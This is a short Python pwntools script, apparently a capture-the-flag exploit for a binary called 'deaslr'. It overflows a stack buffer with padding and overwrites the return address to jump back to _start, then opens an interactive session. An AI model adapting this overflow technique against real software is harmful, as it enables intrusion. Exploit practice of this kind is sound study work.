from pwn import *

context.log_level = 'debug'

p = process('./deaslr')
#p = remote('',)
e = ELF('./deaslr')
l = e.libc
#l = ELF('./')

pause()

_start = 0x400440
payload = 'a' * 0x10 + 'b' * 8
payload += p64(_start)

p.sendline(payload)

p.interactive()
